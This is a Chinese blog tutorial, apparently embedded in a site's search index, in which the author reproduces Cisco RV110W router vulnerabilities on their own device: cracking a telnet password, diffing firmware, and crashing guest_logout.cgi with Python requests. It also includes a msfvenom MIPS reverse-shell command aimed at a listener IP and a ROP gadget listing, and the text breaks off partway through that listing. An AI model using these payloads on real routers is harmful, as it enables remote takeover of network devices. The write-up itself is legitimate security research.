<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RV110W路由器漏洞复现/2020年强网杯赛题</title>
      <link href="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/"/>
      <url>/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="RV110W路由器漏洞复现"><a href="#RV110W路由器漏洞复现" class="headerlink" title="RV110W路由器漏洞复现"></a>RV110W路由器漏洞复现</h1><blockquote><p>被<code>xuanxuan</code>老师种草了~，”一定要摸真实的设备”这句话余音绕梁，终于狠下心买了一个二手的<code>RV110W</code>，开始我的路由器漏洞复现之路，希望能学到点东西！</p></blockquote><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/25-1633419468547.jpg" class=""><h4 id="0x00-开端"><a href="#0x00-开端" class="headerlink" title="0x00 开端"></a>0x00 开端</h4><p>拿到路由器接上电源网线，电脑连接上<code>RV100W</code>就遇到了第一个问题，怎么进入后台？好吧，萌新没怎么玩过路由器，都是按照路由器背面的IP来登录，好巧不巧，它的背面很干净，啥都没有，看<code>lemon</code>师傅的视频看到10.10.10.1兴致冲冲的去访问，结果进了一个交换机的登录界面，奇了怪了，后来询问<code>lemon</code>师傅，要看路由器的网关IP进去，至此第一个问题顺利解决，初始密码是<code>cisco:cisco</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/1.png" class=""><p>很顺利的进入后台，进入<code>Administration =&gt; Firmware/Language Upgrade</code>，看到固件的版本不对，是多少来着忘了，反正很老的一个固件，下面提供了固件的升级，我直接就拿<code>xuanxuan</code>老师的固件刷进去了，等了好一会，它就重启了，再次进入就发现固件版本已经变成1.2.2.5了</p><p><a href="https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin">固件链接</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2.png" class=""><h4 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h4><p>到这，准备工作已经完成了！</p><p>那就开始真实环境下的漏洞复现了，首先一般我们想要找一个设备的漏洞，那得先看有什么服务吧！那么从服务很容易联想到端口，所以最开始我们先用<strong>端口扫描</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sT -p0-65535 192.168.1.1</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/3.png" class=""><p>扫完了，就想看看源码，就要对<strong>固件进行解包</strong>，固件提取拿以前的一张图来看</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/2.png" class=""><p>这里就是<code>xuanxuan</code>老师那边拿的，算是互联网搜索吧！</p><p><code>xuanxuan</code>老师那说要安装<code>sasquatch</code>这个组件，但是在<code>AttifyOs</code>那直接<code>binwalk</code>就开了？？？可能是<code>AttifyOs</code>的<code>binwalk</code>比较完整吧，不太清楚</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/4.png" class=""><p>解包完成之后，查看<code>busybox</code>的版本是<code>MIPS32</code>小端序的路由器</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/5.png" class=""><p>之后就是<strong>搜集漏洞信息</strong></p><h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h4><h3 id="CVE-2020-3330"><a href="#CVE-2020-3330" class="headerlink" title="CVE-2020-3330"></a>CVE-2020-3330</h3><p>之前扫到23端口是开着的，搜索发现大多数文件都是链接到rc这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&gt; find . | xargs grep -ri &quot;admin:\\\$&quot;</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">grep: ./usr/local/libexec/ipsec/setup: No such file or directory</span><br><span class="line">Binary file ./sbin/rc matches</span><br><span class="line">Binary file ./sbin/gpio_check matches</span><br><span class="line">Binary file ./sbin/write matches</span><br><span class="line">Binary file ./sbin/ca_manage matches</span><br><span class="line">Binary file ./sbin/ses_led matches</span><br><span class="line">Binary file ./sbin/ipsec_fqdn_detect matches</span><br><span class="line">Binary file ./sbin/sendudp matches</span><br><span class="line">Binary file ./sbin/check_ses_led matches</span><br><span class="line">Binary file ./sbin/stats matches</span><br><span class="line">Binary file ./sbin/ddns_update_data matches</span><br><span class="line">Binary file ./sbin/services matches</span><br><span class="line">Binary file ./sbin/restore matches</span><br><span class="line">Binary file ./sbin/info matches</span><br><span class="line">Binary file ./sbin/preinit matches</span><br><span class="line">Binary file ./sbin/qkvpn_rekey matches</span><br><span class="line">Binary file ./sbin/ipsec-up matches</span><br><span class="line">Binary file ./sbin/calc_vpnconn_time matches</span><br><span class="line">Binary file ./sbin/bootnv matches</span><br><span class="line">Binary file ./sbin/ipsec_wanlink matches</span><br><span class="line">Binary file ./sbin/usb_test matches</span><br><span class="line">Binary file ./sbin/icmp_echo matches</span><br><span class="line">Binary file ./sbin/cron_iaprule matches</span><br><span class="line">Binary file ./sbin/waninfo matches</span><br><span class="line">Binary file ./sbin/ntpd matches</span><br><span class="line">Binary file ./sbin/detectwan matches</span><br><span class="line">Binary file ./sbin/ipsec_fw matches</span><br><span class="line">Binary file ./sbin/ddns_success matches</span><br><span class="line">Binary file ./sbin/cpu_usage matches</span><br><span class="line">Binary file ./sbin/cron_aclrule matches</span><br><span class="line">Binary file ./sbin/firewall matches</span><br><span class="line">Binary file ./sbin/generate_md5sum matches</span><br><span class="line">Binary file ./sbin/init matches</span><br><span class="line">Binary file ./sbin/listen matches</span><br><span class="line">Binary file ./sbin/check_ps matches</span><br><span class="line">Binary file ./sbin/snmpdc matches</span><br><span class="line">Binary file ./sbin/process_monitor matches</span><br><span class="line">Binary file ./sbin/rc matches</span><br></pre></td></tr></table></figure><p>把放到IDA里面，搜字符串定位关键函数</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/26.jpg" class=""><p>随便翻下就有了个明文字符串，拿去解一下MD5</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/27.jpg" class=""><p>密码就出来了，我们就可以通过<code>telnet</code>来传<code>gdbserver</code>就不用拆机器了</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/6.png" class=""><h3 id="CVE-2020-3331-CVE-2020-3323"><a href="#CVE-2020-3331-CVE-2020-3323" class="headerlink" title="CVE-2020-3331/CVE-2020-3323"></a>CVE-2020-3331/CVE-2020-3323</h3><h5 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h5><p>1.2.2.5这个固件的版本相对来说比较旧，所以一个很常用的手法就是去<code>diff</code>文件，拿已经修复此漏洞的固件进行<code>diff</code>，能够更容易的去定位漏洞点，<code>diff</code>有俩常见的工具，<code>bindiff</code>和<code>diaphora</code></p><h6 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h6><p><a href="https://www.zynamics.com/software.html">bindiff下载链接</a></p><p>选<code>.msi</code>下载就行，安装路径为IDA的主目录，之后打开IDA在插件那边就能看见<code>bindiff</code>了，把要比对的文件先打开再保存成<code>idb</code>文件，然后点<code>bindiff</code>选择要比对的<code>idb</code>就能开始比对啦！</p><p><code>ps：user</code>的目录不要有中文，否则你会很不幸</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/8.jpg" class=""><p>越往下滑呢！它就越有可能是目标，因为越下面就越不匹配，由于漏洞描述是前台的洞，所以选中的那个函数有可能就是目标，这里简单讲讲我认识什么的前台什么的后台？</p><p>前台：与用户进行交互的界面</p><p>后台：对用户隐藏的那部分数据处理与逻辑处理</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/9.jpg" class=""><p>查阅资料得知，每个基本块颜色的说明：</p><blockquote><p>绿色：相同的基本块</p><p>黄色：修改的基本块</p><p>红色：删掉的基本块</p><p>灰色：新加的基本块</p></blockquote><p>右键<code>view flow graphs</code>就可以查看汇编代码对比，找了半天才找到，就离谱</p><p><code>ps：</code>千万不要直接把两个<code>idb</code>直接丢到<code>idb</code>，不然你会知道什么叫浪费时间（<code>bindiff</code>直接打开的分析速度感人</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/10.jpg" class=""><p>除此之外，你如果对二进制的漏洞点以及危险函数比较熟悉的话，双击点进去，很容易就看到这个没有限制长度的<code>sscanf</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/11.jpg" class=""><h6 id="diaphora"><a href="#diaphora" class="headerlink" title="diaphora"></a>diaphora</h6><p>吐了，老是报错整不好了…，<code>bindiff</code>也能用的啦！只不过是看汇编，<code>diaphora</code>可以看源码，下次再补上…</p><p>**%[ ^;];%*[ ^=]=%[ ^\n]**是一个正则表达式，%是代表选择，%*是过滤    </p><blockquote><ol><li><code>%[^;]</code>：分号前的所有字符都要</li><li><code>;%*[^=]</code>：分号后，等号前的字符都不要</li><li><code>=%[^\n]</code>：等号后，换行符前的所有字符都要</li></ol></blockquote><p>看不是很懂，那就上个<code>demo</code>吧！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> var1[<span class="number">5</span>] = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var2[<span class="number">5</span>] = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> var3[<span class="number">5</span>] = <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> welcome[<span class="number">100</span>] = <span class="string">&quot;wElc0me t= reGuIar @xpr&amp;ss!0n w0rld;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(welcome,<span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, var1, var2, var3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n%s\n&quot;</span>,var1,var2,var3);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到运行结果，还是很奇怪，留坑了…</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/12.png" class=""><p>发包测试一下是否存在溢出，发送GET报文发现并没有什么事情发生</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.get(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>但是发生POST报文的时候，发现<code>web</code>页面在疯狂转圈圈，就是崩了，至于为什么只测试这两个请求头，二进制狗表示不太清楚…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/23.png" class=""><h4 id="确定溢出偏移"><a href="#确定溢出偏移" class="headerlink" title="确定溢出偏移"></a>确定溢出偏移</h4><p>崩了就意味着，有漏洞点的存在，那接下来就是调试的事情了，用的是海特实验室的<code>gdbserver</code>，其实还有一个是<code>gef</code>开发者编译的<code>gdbserver</code></p><p><a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">海特实验室 IOT_Wiki</a></p><p><a href="https://github.com/hugsy/gdb-static">gef author</a></p><p>启动一个窗口起一个简单的http服务器</p><p><strong>python2:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure><p><strong>python3：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  python -m http.server 8080</span><br></pre></td></tr></table></figure><p>ps：建议启动浏览器复制链接，真的好用！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/15.jpg" class=""><p>再启动一个窗口<code>telnet</code>连接上路由器用<code>wget</code>（路由器里面自带的）挂上<code>gdbserver</code>，就可以远程调试了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  telnet 192.168.1.1</span><br><span class="line">➜  <span class="built_in">cd</span> tmp</span><br><span class="line">➜  wget <span class="string">&quot;http://192.168.181.178:8080/home/laohu/Desktop/gdbserver&quot;</span></span><br><span class="line">➜  chmod +x gdbserver</span><br><span class="line">➜  ps | grep <span class="string">&quot;httpd&quot;</span></span><br><span class="line">➜  ./gdbserver :1234 --attach 356<span class="comment">#看httpd -S的进程号，另一个好像调试不了</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/7.png" class=""><p>传进去之后，恶梦才刚刚开始….我根本想不到这问题出在哪里！尝试换终端（改成<code>dash</code>），换架构（在树莓派上尝试），换目录（换到<code>data</code>目录）之后，终于摸索到了关键原因—-<code>gdbserver</code>本身，各位大师傅们的<code>gdbserver</code>为<code>gdbserver-7.12-mipsel-mips32rel2-v1-sysv</code> ，我死活用不了，我尝试甚至在我朋友上的电脑上尝试都不行，可能大师傅们的电脑是<code>MacOS</code>吧，咱也不知道，咱也不敢问，我最后在换到<code>gdbserver-7.12-mipsel-i-v1-sysv</code>之后，终于可以使用了！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/16.jpg" class=""><p>终于…下一个错误来了，<code>gdb-mutilarch</code>进行远程调试的时候，<code>remote</code>上去的时候断不下来，报下面这个错，看到下面<code>capstone</code>好像出现了问题，怀疑是版本过低，重新安装<code>pwntools</code>解决问题</p><p><a href="https://blog.csdn.net/weixin_33674976/article/details/85219451">5年了…Capstone 终于升级到4.0！</a></p><p><a href="https://blog.csdn.net/zhr12321/article/details/116742894">解决方法</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/13.png" class=""><p>此处，终于看到调试界面了，泪目！！！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/14.png" class=""><p>来来来，问题怪又来了…，按照大师傅们的做法，按下<code>c</code>之后，输入<code>cyclic 200</code>生成的字符串，就会崩掉，并看到<code>PC</code>寄存器被覆盖…但我…没反应啊！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/17.jpg" class=""><p>解决办法就是先在<code>sscanf</code>之前下断点（后面测试其实不用下断点也是一样的，然后再<code>c</code>，接着用<code>exp</code>打一下，就断下来了，原因是因为我们本身就是<code>attach</code>上<code>httpd</code>这个进程，所以这个进程本身还在运行，如果我们打了断点并用<code>exp</code>打过去的话，它就会按照以往正常的业务逻辑去执行，但是再执行的过程中被中断了，所以…就断了下来，再往下走的，我们就能看到<code>PC</code>寄存器被覆盖了！接下来就是常规操作用<code>cyclic -l</code>来计算偏移</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/19.png" class=""><p>确定好溢出的长度就可以开始利用了，基本上都是<code>ROP+shellcode</code>的形式，那么现在就是生成<code>shellcode</code>和泄露<code>libc</code>获取<code>gadget</code>的问题了</p><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>shellcode一般来说可以使用以下四种方式获取：</p><ol><li>msfvenom</li><li>shell-storm</li><li>pwntools</li><li>自己编写（简单的<code>shellcode</code>还是可以写写的</li></ol><p>其他都有试过，<code>msf</code>还没试过这里记录一下…<code>msf</code>支持好多版本的<code>shellcode</code>，太香了吧！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/18.png" class=""><p>用下面的命令就能生成，注意IP和端口匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure><blockquote><p>总的来说还是：<code>msf</code>更方便好用，并且非常稳。<code>shell-storm</code>找到的种类多，不过偶尔需要手动修改。最后对于真实设备的利用上<code>pwntools</code>会有很多的问题，所以这里不推荐使用<code>pwntools</code>生成<code>shellcode</code></p></blockquote><p><code>shell-storm</code>里面的<code>shellcode</code>也是能用的，不过需要修改IP地址</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-860.php">200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb</a></p><h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>既然要<code>ROP</code>，那必然要泄露<code>libc</code>，但是在大部分IOT设备中，地址随机化是不会变化的，包括这个设备，所以在<code>maps</code>中加载的<code>libc</code>地址就是它一直使用的<code>libc</code>地址，无论是重启还是换固件版本甚至在<code>RV130</code>中，<code>libc</code>的基地址都一样，这就省去了很多步骤，下面引用<code>xuanxuan</code>老师的一段话：</p><blockquote><p>问了常老师，再次猜测可能是为了效率，编译的时候就把内核的这个功能干掉了，或者当前平台压根就不支持这个功能。先存疑，总之我们发现动态库的基址都是不变的，故我们可以使用程序加载的动态库中的<code>gadget</code>。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cat /proc/356/maps</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/20.png" class=""><p>可以看到很多<code>libc</code>，而<code>libc.so.0</code>的基地址是<strong>2af98000</strong></p><p>得到了<code>libc</code>基地址，只让是寻找一些可用的<code>gadget</code>，我们使用IDA的插件—-<code>mipsrop</code>，由于安装的时候发现，它对IDA 7.5不是很支持，所以还是出了一些小问题，这里记录一下…</p><p><a href="https://www.jianshu.com/p/0f5923fac8d4">解决IDA 无法安装mipsrop插件</a></p><p><a href="https://bbs.pediy.com/thread-266102.htm">IDA 无法安装mipsrop插件</a></p><p>安装成功后呢，在<code>search</code>中就能看到<code>mips rop gadgets</code>，点击之后加载了<code>mipsrop</code>插件了</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/21.jpg" class=""><p>可以用<code>mipsrop.help()</code>查看<code>mipsrop</code>的一些常用命令</p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">mipsrop常用命令</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/22.png" class=""><p>在上面的程序加载了很多动态链接库，但是却唯独选择了**/lib/libc.so.0**这个动态链接库来寻找<code>gadget</code>，为啥呢？估计是比较熟悉吧！</p><p>用<code>mipsrop.stackfinders()</code>来寻找一些<code>gadget</code>，这些<code>gadget</code>都是和栈（<code>$sp</code>）相关的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinders()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x158+var_A0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x68+var_40                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x278+var_250                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s1                        